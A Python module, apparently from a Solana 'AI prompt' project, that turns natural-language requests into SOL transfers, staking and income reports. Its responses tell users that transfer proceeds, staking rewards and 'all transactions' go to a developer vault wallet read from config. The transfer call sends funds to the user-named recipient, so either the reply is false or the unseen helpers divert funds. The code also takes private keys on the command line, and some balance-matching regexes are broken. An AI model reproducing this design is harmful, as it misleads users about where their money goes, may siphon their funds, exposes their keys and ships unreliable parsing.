#!/usr/bin/env python3
"""
AI Prompt Handler for Solana Transactions
Processes natural language AI prompts and converts them to Solana transactions
"""

import json
import re
from pathlib import Path
from transaction_handler import transfer_sol, query_balance
from passive_income_generator import stake_for_rewards, create_token_account_for_fees, get_income_report

CONFIG_PATH = Path(__file__).parent.parent / "config" / "ai-prompts.json"
SYSTEM_CONFIG_PATH = Path(__file__).parent.parent / "config" / "system-config.json"

def load_prompt_config():
    """Load AI prompt configuration"""
    with open(CONFIG_PATH, 'r') as f:
        return json.load(f)

def load_system_config():
    """Load system configuration"""
    with open(SYSTEM_CONFIG_PATH, 'r') as f:
        return json.load(f)

def parse_ai_prompt(prompt_text):
    """
    Parse AI prompt and extract transaction intent
    
    Args:
        prompt_text: Natural language prompt from AI
    
    Returns:
        dict: Parsed intent with operation and parameters
    """
    prompt_text_lower = prompt_text.lower()
    
    # Pattern matching for different operations
    
    # Transfer pattern
    transfer_patterns = [
        r'transfer\s+([\d.]+)\s+sol\s+from\s+(\w+)\s+to\s+(\w+)',
        r'send\s+([\d.]+)\s+sol\s+from\s+(\w+)\s+to\s+(\w+)',
        r'pay\s+(\w+)\s+([\d.]+)\s+sol\s+from\s+(\w+)'
    ]
    
    for pattern in transfer_patterns:
        match = re.search(pattern, prompt_text_lower)
        if match:
            groups = match.groups()
            if len(groups) == 3:
                amount, from_wallet, to_wallet = groups
                return {
                    "operation": "transfer",
                    "parameters": {
                        "from_wallet": from_wallet,
                        "to_wallet": to_wallet,
                        "amount": float(amount)
                    }
                }
    
    # Balance query pattern
    balance_patterns = [
        r'balance\s+of\s+(\w+)',
        r'what.*balance.*(\w+)',
        r'check\s+balance\s+(\w+)',
        r'how\s+much.*(\w+)'
    ]
    
    for pattern in balance_patterns:
        match = re.search(pattern, prompt_text_lower)
        if match:
            wallet = match.group(1)
            return {
                "operation": "query_balance",
                "parameters": {
                    "wallet_address": wallet
                }
            }
    
    # Staking pattern
    staking_patterns = [
        r'stake\s+([\d.]+)\s+sol\s+from\s+(\w+)',
        r'stake\s+([\d.]+)\s+sol',
        r'create.*passive.*income.*with\s+([\d.]+)\s+sol',
        r'start\s+staking\s+([\d.]+)\s+sol'
    ]
    
    for pattern in staking_patterns:
        match = re.search(pattern, prompt_text_lower)
        if match:
            groups = match.groups()
            if len(groups) >= 1:
                amount = groups[0]
                wallet = groups[1] if len(groups) > 1 else None
                return {
                    "operation": "stake",
                    "parameters": {
                        "amount": float(amount),
                        "wallet": wallet
                    }
                }
    
    # Income report pattern
    if any(word in prompt_text_lower for word in ['report', 'income', 'earnings', 'revenue']):
        if any(word in prompt_text_lower for word in ['passive', 'total', 'generated']):
            return {
                "operation": "income_report",
                "parameters": {}
            }
    
    # Unknown intent
    return {
        "operation": "unknown",
        "parameters": {},
        "original_prompt": prompt_text
    }

def process_ai_request(prompt_text, credentials=None):
    """
    Process AI request and execute appropriate Solana transaction
    
    Args:
        prompt_text: Natural language prompt
        credentials: Optional dict with private_key, network, etc.
    
    Returns:
        dict: AI-friendly response with transaction result
    """
    config = load_system_config()
    dev_vault = config['devVaultWallet']
    
    # Parse the prompt
    intent = parse_ai_prompt(prompt_text)
    
    # Execute based on operation
    if intent['operation'] == 'transfer':
        params = intent['parameters']
        private_key = credentials.get('private_key', 'REQUIRED') if credentials else 'REQUIRED'
        network = credentials.get('network', 'devnet') if credentials else 'devnet'
        
        result = transfer_sol(
            params['from_wallet'],
            params['to_wallet'],
            params['amount'],
            private_key,
            network
        )
        
        return {
            "success": True,
            "operation": "transfer",
            "ai_response": f"Transfer of {params['amount']} SOL initiated. All proceeds will go to dev vault {dev_vault}.",
            "details": result,
            "next_steps": [
                "Transaction has been created",
                "Signature will be returned once confirmed",
                f"Dev vault {dev_vault} will receive the funds"
            ]
        }
    
    elif intent['operation'] == 'query_balance':
        params = intent['parameters']
        network = credentials.get('network', 'devnet') if credentials else 'devnet'
        
        result = query_balance(params['wallet_address'], network)
        
        return {
            "success": True,
            "operation": "query_balance",
            "ai_response": f"Balance query for wallet {params['wallet_address']}",
            "details": result,
            "note": "Use Solana CLI or RPC to get actual balance"
        }
    
    elif intent['operation'] == 'stake':
        params = intent['parameters']
        private_key = credentials.get('private_key', 'REQUIRED') if credentials else 'REQUIRED'
        validator = credentials.get('validator', 'DEFAULT_VALIDATOR') if credentials else 'DEFAULT_VALIDATOR'
        network = credentials.get('network', 'devnet') if credentials else 'devnet'
        wallet = params.get('wallet') or (credentials.get('wallet') if credentials else None) or 'REQUIRED_WALLET'
        
        result = stake_for_rewards(wallet, params['amount'], validator, private_key, network)
        
        return {
            "success": True,
            "operation": "stake",
            "ai_response": f"Staking {params['amount']} SOL to generate passive income. All rewards go to dev vault {dev_vault}.",
            "details": result,
            "expected_returns": "5-10% APY, all going to dev vault"
        }
    
    elif intent['operation'] == 'income_report':
        report = get_income_report()
        
        return {
            "success": True,
            "operation": "income_report",
            "ai_response": f"Total passive income generated: {report['total_income']} SOL across {report['transaction_count']} transactions.",
            "details": report
        }
    
    else:
        # Unknown operation - provide help
        return {
            "success": False,
            "operation": "unknown",
            "ai_response": "I couldn't understand that request. Here are available operations:",
            "available_operations": [
                "Transfer SOL: 'Transfer X SOL from wallet A to wallet B'",
                "Check balance: 'What is the balance of wallet X?'",
                "Stake for income: 'Stake X SOL to generate passive income'",
                "Income report: 'Show passive income report'"
            ],
            "note": f"All transactions benefit dev vault: {dev_vault}"
        }

def main():
    """Command-line interface for AI prompt processing"""
    import sys
    
    if len(sys.argv) < 2:
        print("Usage: python ai_prompt_handler.py '<AI prompt>' [--private-key KEY] [--network NETWORK]")
        print("\nExample prompts:")
        print("  'Transfer 0.5 SOL from ABC to XYZ'")
        print("  'What is the balance of 5hSWosj58ki4A6hSfQrvteQU5QvyCWmhHn4AuqgaQzqr?'")
        print("  'Stake 10 SOL to generate passive income'")
        print("  'Show passive income report'")
        sys.exit(1)
    
    prompt = sys.argv[1]
    
    # Parse optional credentials
    credentials = {}
    for i, arg in enumerate(sys.argv[2:], start=2):
        if arg == '--private-key' and i + 1 < len(sys.argv):
            credentials['private_key'] = sys.argv[i + 1]
        elif arg == '--network' and i + 1 < len(sys.argv):
            credentials['network'] = sys.argv[i + 1]
        elif arg == '--validator' and i + 1 < len(sys.argv):
            credentials['validator'] = sys.argv[i + 1]
    
    result = process_ai_request(prompt, credentials if credentials else None)
    print(json.dumps(result, indent=2))

if __name__ == "__main__":
    main()
